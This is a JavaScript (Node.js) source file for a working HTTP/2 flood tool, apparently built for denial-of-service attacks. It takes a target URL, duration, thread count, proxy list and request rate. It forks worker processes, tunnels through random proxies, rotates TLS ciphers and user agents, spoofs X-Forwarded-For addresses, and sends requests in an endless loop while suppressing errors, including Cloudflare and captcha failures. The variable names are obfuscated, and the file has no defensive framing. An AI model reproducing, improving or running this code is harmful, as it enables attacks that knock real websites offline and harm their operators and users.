const url = require("url"),
      fs = require("fs"),
      http2 = require("http2"),
      http = require("http"),
      tls = require("tls"),
      cluster = require("cluster"),
      fakeua = require("fake-useragent"),
      randstr = require("randomstring"),
      cplist = ["ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM", "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH", "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL", "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5", "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS", "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK"],
      accept_header = ["text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3"],
      lang_header = ["he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7", "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5", "en-US,en;q=0.5", "en-US,en;q=0.9", "de-CH;q=0.7", "da, en-gb;q=0.8, en;q=0.7", "cs;q=0.5"],
      encoding_header = ["deflate, gzip;q=1.0, *;q=0.5", "gzip, deflate, br", "*"],
      controle_header = ["no-cache", "no-store", "no-transform", "only-if-cached", "max-age=0"],
      ignoreNames = ["RequestError", "StatusCodeError", "CaptchaError", "CloudflareError", "ParseError", "ParserError"],
      ignoreCodes = ["SELF_SIGNED_CERT_IN_CHAIN", "ECONNRESET", "ERR_ASSERTION", "ECONNREFUSED", "EPIPE", "EHOSTUNREACH", "ETIMEDOUT", "ESOCKETTIMEDOUT", "EPROTO"];

process.on("uncaughtException", function (_0x59d4f0) {
  if (_0x59d4f0.code && ignoreCodes.includes(_0x59d4f0.code) || _0x59d4f0.name && ignoreNames.includes(_0x59d4f0.name)) {
    return !1;
  }
}).on("unhandledRejection", function (_0x2f4f89) {
  if (_0x2f4f89.code && ignoreCodes.includes(_0x2f4f89.code) || _0x2f4f89.name && ignoreNames.includes(_0x2f4f89.name)) {
    return !1;
  }
}).on("warning", _0x5377d1 => {
  if (_0x5377d1.code && ignoreCodes.includes(_0x5377d1.code) || _0x5377d1.name && ignoreNames.includes(_0x5377d1.name)) {
    return !1;
  }
}).setMaxListeners(0);

function accept() {
  return accept_header[Math.floor(Math.random() * accept_header.length)];
}

function lang() {
  return lang_header[Math.floor(Math.random() * lang_header.length)];
}

function encoding() {
  return encoding_header[Math.floor(Math.random() * encoding_header.length)];
}

function controling() {
  return controle_header[Math.floor(Math.random() * controle_header.length)];
}

function cipher() {
  return cplist[Math.floor(Math.random() * cplist.length)];
}

function spoof() {
  const _0x1dd4e3 = {
    length: 1,
    charset: "12"
  };
  const _0x1c7381 = {
    length: 1,
    charset: "012345"
  };
  const _0x26c513 = {
    length: 1,
    charset: "012345"
  };
  const _0x51ae53 = {
    length: 1,
    charset: "12"
  };
  const _0x3299ca = {
    length: 1,
    charset: "012345"
  };
  const _0x211454 = {
    length: 1,
    charset: "012345"
  };
  const _0x55f563 = {
    length: 1,
    charset: "12"
  };
  const _0x10f1b4 = {
    length: 1,
    charset: "012345"
  };
  const _0x4b5a8b = {
    length: 1,
    charset: "012345"
  };
  const _0x3189ef = {
    length: 1,
    charset: "12"
  };
  const _0xadc37f = {
    length: 1,
    charset: "012345"
  };
  const _0x3530ad = {
    length: 1,
    charset: "012345"
  };
  return "" + randstr.generate(_0x1dd4e3) + randstr.generate(_0x1c7381) + randstr.generate(_0x26c513) + "." + randstr.generate(_0x51ae53) + randstr.generate(_0x3299ca) + randstr.generate(_0x211454) + "." + randstr.generate(_0x55f563) + randstr.generate(_0x10f1b4) + randstr.generate(_0x4b5a8b) + "." + randstr.generate(_0x3189ef) + randstr.generate(_0xadc37f) + randstr.generate(_0x3530ad);
}

function randomByte() {
  return Math.round(Math.random() * 256);
}

function randomIp() {
  const _0x1231ca = randomByte() + "." + randomByte() + "." + randomByte() + "." + randomByte();

  return isPrivate(_0x1231ca) ? _0x1231ca : randomIp();
}

function isPrivate(_0x49d280) {
  return /^(10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[0-1]))/.test(_0x49d280);
}

tls.DEFAULT_ECDH_CURVE;
tls.authorized = true;
tls.sync = true;
const target = process.argv[2],
      time = process.argv[3],
      thread = process.argv[4],
      proxys = fs.readFileSync(process.argv[5], "utf-8").toString().match(/\S+/g),
      rps = process.argv[6];

function proxyr() {
  return proxys[Math.floor(Math.random() * proxys.length)];
}

if (cluster.isMaster) {
  console.log("Target: " + target + " | Threads: " + thread + " | RPS: " + rps);

  for (let i = 0; i < process.argv[4]; i++) {
    cluster.fork();
  }

  setTimeout(() => {
    process.exit(-1);
  }, time * 1000);
} else {
  function flood() {
    var _0x4b427b = url.parse(target);

    const _0x5d3d5e = fakeua();

    var _0xc87af6 = cipher();

    var _0x6ad640 = proxyr().split(":"),
        _0x1d75d7 = randomIp(),
        _0x2712d5 = {
      ":path": _0x4b427b.path.replace("$rand$", spoof()),
      "X-Forwarded-For": _0x1d75d7,
      ":method": "GET",
      "User-agent": _0x5d3d5e,
      Origin: target,
      "Cache-Control": "max-age=0"
    };

    const _0x4b920f = {
      keepAlive: true,
      keepAliveMsecs: 50000,
      maxSockets: Infinity,
      maxTotalSockets: Infinity
    };
    _0x4b920f.keepAlive = true;
    _0x4b920f.keepAliveMsecs = 50000;
    _0x4b920f.maxSockets = Infinity;
    _0x4b920f.maxTotalSockets = Infinity;
    _0x4b920f.maxSockets = Infinity;

    const _0x4715a7 = new http.Agent(_0x4b920f),
          _0x1c75d1 = {
      Host: _0x4b427b.host,
      "Proxy-Connection": "Keep-Alive",
      Connection: "Keep-Alive"
    };

    var _0x1db3cf = http.request({
      host: _0x6ad640[0],
      agent: _0x4715a7,
      globalAgent: _0x4715a7,
      port: _0x6ad640[1],
      headers: _0x1c75d1,
      method: "CONNECT",
      path: _0x4b427b.host + ":443"
    }, function () {
      _0x1db3cf.setSocketKeepAlive(true);
    });

    _0x1db3cf.on("connect", function (_0x2eacbc, _0x209b32, _0x2788cf) {
      const _0x13faa3 = http2.connect(_0x4b427b.href, {
        createConnection: () => tls.connect({
          host: _0x4b427b.host,
          ciphers: _0xc87af6,
          secureProtocol: "TLS_method",
          TLS_MAX_VERSION: "1.3",
          port: 80,
          servername: _0x4b427b.host,
          maxRedirects: 20,
          followAllRedirects: true,
          curve: "GREASE:X25519:x25519",
          secure: true,
          rejectUnauthorized: false,
          ALPNProtocols: ["h2"],
          sessionTimeout: 5000,
          socket: _0x209b32
        }, function () {
          for (let _0x269ad3 = 0; _0x269ad3 < rps; _0x269ad3++) {
            const _0x37a904 = _0x13faa3.request(_0x2712d5);

            _0x37a904.setEncoding("utf8");

            _0x37a904.on("data", _0x424cfb => {});

            _0x37a904.on("response", () => {
              _0x37a904.close();
            });

            _0x37a904.end();
          }
        })
      });
    });

    _0x1db3cf.end();
  }

  setInterval(() => {
    flood();
  });
}